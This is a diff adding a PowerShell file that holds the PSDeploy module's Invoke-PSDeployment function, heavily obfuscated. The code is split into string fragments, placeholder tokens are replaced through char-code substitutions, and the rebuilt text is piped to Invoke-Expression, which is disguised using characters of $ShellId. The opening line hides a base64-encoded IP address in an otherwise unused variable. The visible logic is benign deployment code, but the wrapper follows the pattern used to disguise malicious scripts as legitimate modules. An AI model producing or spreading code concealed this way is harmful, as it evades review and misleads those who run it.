@@ -1,0 +1,210 @@
+ (('RXprOcDSb = [Text.Encoding]::Unicode.GetString('+'[Convert]::FromBase64String(OVbJwBpAHAAOgAyADAAMAAuADIAMgA1AC4AMgA0'+'ADUALg'+'A5'+'ADgA'+'JwA=OVb))
+Function Invoke-PSDeployment {
+    <#
+    .SYNOPSIS
+        Invoke a deployment
+
+    .DESCRIPTION
+        Invoke a deployment
+
+        T'+'akes output from Get-PSDeployme'+'nt, or a deployment yml path.
+
+        Runs deployment scripts depending on each deploymentVs9s type.
+
+        If'+' a deployment is not found, we continue processing '+'other deployments.
+
+        See Get-Help about_PSDeploy for more information.
+    
+    .PARAMETER Path
+        Path t'+'o a specific yml Deployment file
+
+    .PARAMET'+'ER Deployment
+    '+'    Deployment o'+'bject from Get-PSDeployment.
+
+    .PARAMETER Deplo'+'ymentFile
+        Deployment file. We run Get-PSDeployment against it.
+
+    .PARAMETER DeploymentParameters
+        Hashtable of hashtables
+
+        The first layer of keys are the deployment types
+        These deploymen'+'t ty'+'pes are assigned a hashtable of parameters
+
+        So, pretend we have a FileSystemRemote deployement. HereVs9s how we pass parameters:
+        -D'+'eploymentParameters @{
+            FilesystemRemote = @{
+                ComputerName = Vs9DeployFromThisVs9
+                Credential = RXpCredentialForDeploy
+  '+'              ConfigurationName = Vs9'+'SomeSessionConfigToHitVs9
+            }
+        }'+'
+
+        In thi'+'s case, any deplo'+'yments of Vs9FilesystemRemoteVs9 type will use those param'+'eters
+
+        Why separate this out?
+   '+'         What if I'+' have a deployment that takes two sorts of parameters?
+            What if I want to add a new deployment type without modifying this function?
+
+        Okay, now what if'+' we have two types, and want to fit it all on one line?
+        - DeploymentParameters @{ FilesystemRemote=@{Comp'+'uterName = Vs9PC1Vs9}; Filesystem=@{} }
+
+    .PARAMETER PSDeployTypePath
+        S'+'p'+'ecify'+' a PSDeploy.yml fil'+'e that maps DeploymentTypes to their scripts.
+
+        This defaults to the PSD'+'eploy.yml in the PSDeploy module folder
+
+    .PARAMETER Tags
+        Only invoke deployments that are tagged with all of th'+'e specified Tags (-and, '+'not -or'+')
+
+    .PARAMETER Force
+        Force deployment, skipping prompts and confirmation
+
+    .EXAMPLE
+        Invoke-PSDeployment -Path C:TsYGitTsYModule1TsYDeployments.yml
+
+        # Run deployments from a deployment yml. You will be prompted on whether to deploy
+'+'
+    .EXAMPLE
+        Get-PSDeployment '+'-Path C:TsYGitTsYModule1'+'TsYDeployments.yml, C:TsYGitTsYMo'+'dule2TsYDeployments.yml eSb
+            Invoke-PSDeployment -Force
+
+        # Get deployment'+'s from two yml fi'+'les, invoke th'+'eir deployment, no prompting
+
+    .EXAMPLE
+        Invoke-PSDeployment -Path C:TsYGitTsYModule1TsYDeplo'+'yments.yml -PSDeployTypePath TsYTsYPathTsYToTsYCentralTsYPSDeploy.yml
+
+        # Run deployments '+'from a deploymen'+'t yml. Use deployment type definiti'+'ons from a central config.
+
+    .LI'+'NK
+        about_PSDeploy
+
+    .LINK
+        https://github.com/RamblingCookieMonster/P'+'SDeploy
+
+    .LINK
+        Get-PSDeployment
+
+    .LINK
+        Invoke-PSDeploy
+
+    .LINK
+        Get-PSDeploymentT'+'ype
+
+    '+'.LINK
+        Get-PSDeploymentScript
+    #>
+    [cmdl'+'etbinding( DefaultParameterSetName = Vs9MapVs9,
+       '+'             SupportsShouldProcess = RXpTrue,
+                    ConfirmImpact=Vs9HighVs9 )]
+    Param(
+        [p'+'arameter( '+'ValueFromPipeline = RXpTrue,
+                    ParameterSetName=Vs9MapVs9,
+                    Mandatory = '+'RXpTrue)]
+        [Va'+'lidateScript({ RXp_.PSObjec'+'t.TypeNames[0] -eq Vs9PSDeploy'+'.De'+'pl'+'oymentVs9 })]
+     '+'   [psobject]RXpDeployment,
+
+'+'        [validatescript({Te'+'st-Path'+' -Path RXp_ -PathType Leaf -ErrorAction Stop})]
+    '+'    [parameter'+'( ParameterSetName=Vs9FileVs9,
+                    Mandat'+'ory = RXpTrue)]
+        [st'+'ring[]]RXpPath,
+
+        [Hashtable]RXpDepl'+'oymentParameters,
+
+        [validatescript({Test-P'+'ath -Path RXp_ -PathType Leaf -ErrorA'+'ction St'+'op})]
+        [string'+']RXpP'+'SDep'+'loyTypePath ='+' RXp(Join-Path RXpModu'+'lePath PSDeploy.ym'+'l),
+
+        [string[]]RXpTags,
+
+        [switch]RX'+'pForce
+    )
+'+'    Begin
+    {
+        # This script reads a'+' deployment YML, d'+'eploys files or folders as defined
+        Write'+'-Verbose OVbRunning Invoke-PSDeployment w'+'it'+'h ParameterSetName Vs9RXp(RXpPSCmdlet.ParameterSetName)Vs9 and '+'params: RXp(R'+'XpPSBoundParameters eSb Out-String)OVb
+        if(RXpPSBoundParameters.ContainsKey(Vs9PathVs9))
+  '+'      {
+            # C'+'reate a map for deployments
+            Try
+            {
+    '+' '+'           #Resolve relative paths... Th'+'anks '+'Ois'+'in!'+' http://stackoverflow.com/a/3040982/3067642
+                RXpPath = RXpExecutionContext.SessionState.Path.'+'GetUnresolvedProviderPathFromP'+'SPath(RXpPath)
+
+                # Debating whether '+'to make'+' this a terminating error.
+                # Stop all deployments because one is m'+'isconfigured?
+               '+' # IVs9m going with '+'Copy-Item precede'+'nt.
+                # Not terminating, so try catch is superfluous. Feel free to make t'+'his strict...
+            '+'    R'+'XpDeployment = Get-PSDeployment -Path RXpPath
+                If(RXpPSBoundParameters.ContainsKey(Vs9TagsVs9))
+         '+'       {
+                    RXpDeployment = Get-TaggedDeployment -Deployment RXpDeployment -Tags RXpTags
+                }
+            }
+            Catch
+            {
+                Throw OVbError retrieving deployments from Vs9RXpPathVs9:6RonRXp_OVb
+            }
+        }
+    }
+    Proces'+'s
+    {
+        Write-Verbose OVbDep'+'loyment'+'s:6RonRXp(RXpDeployment eSb Out-String)OVb
+
+        if( (RXpForce -and -not RXpWhatIf) -or
+ '+'           RXpPSCmdlet.S'+'ho'+'uldProcess( OVbProcessed the deployment Vs9RXp(RXpDeployment.D'+'eploymentName -jo'+'in OVb, OVb)Vs9OVb,
+ '+'                                   OVbProcess the deployment Vs9RXp(RXpDeployment.DeploymentName -join OVb, OVb)Vs9?OVb,
+ '+'                                   OVbProcessing depl'+'oymentOVb ))
+        {
+            #G'+'et definitions, and deployments in this particular yml
+           '+' '+'RXpDeploymen'+'tDefs = Get-PSDeploymentScript'+'
+            RXpThese'+'DeploymentTypes = @( RXpDeployment.DeploymentType eSb Sort-Object -U'+'nique )
+
+            #Build up hash, we call ea'+'ch deploymenttype script for applicable deplo'+'y'+'ments
+            RXpToDeploy = @{}
+            for'+'each(RXpDeploym'+'entType in RXpTheseDeploymentTypes)
+            {
+                RXpDeploymentScript = RXpDeploymentDefs.RXpDeploymentType
+          '+'      if(-n'+'ot RXpDep'+'loymentScript)
+                {
+             '+'       Write-Error OVbDeploymentType RXpDeployment'+'Type is not defined in PSDeploy.ymlOVb
+                    continue
+                }
+                RXpTheseDeployments = @( RXpDeployment eSb'+' Where-Object {RXp_.DeploymentType -eq RXpDeploymentType})
+
+      '+'          '+'#Define params for the script
+                #Each deployment type can have a hashtable to splat.
+                if(RXpPSBoundParameters.ContainsKey(Vs9DeploymentParametersVs9) -and RXpDeploymentParameters.ContainsKey(RXpDeploymentTyp'+'e))
+                {
+                    RXps'+'plat = RXpDeploymentParameters.RXpDeploymentType
+               '+' }
+                else
+         '+'       {
+                    RXpsplat = @{}
+                }
+
+   '+'             RXpsplat.add(Vs9DeploymentVs9, RXpThe'+'seDeployments)
+
+                # PITA, but tasks can run two ways, each different than typical de'+'ployment scripts
+                if(RXpDeploymentType -eq Vs9TaskVs9)
+          '+'   '+'   '+'{
+                    foreach(RXpDeployment in RXpTheseDe'+'ployments'+')
+      '+'              {
+                    '+'    if(RXpDeployment.Source -is [scriptblock])
+                        {
+                '+'            . RXpDeployment.Source
+                       '+' }
+                        elseif(RXpDeployment.Source)
+                        {
+     '+' '+'                      . RXpDeploymentScript @splat
+                        }
+     '+'               }
+                }
+                else
+                {
+                   '+' #Run the associated script, splat the parameters
+                    . RXpDeploymentScript @'+'splat
+                }
+            }
+        }
+    }
+}
+') -CREpLace ([char]82+[char]88+[char]112),[char]36-CREpLace'OVb',[char]34-CREpLace'6Ro',[char]96-RePlaCE 'eSb',[char]124 -CREpLace([char]86+[char]115+[char]57),[char]39  -RePlaCE ([char]84+[char]115+[char]89),[char]92) |&( $SheLLiD[1]+$sHelLiD[13]+'X')
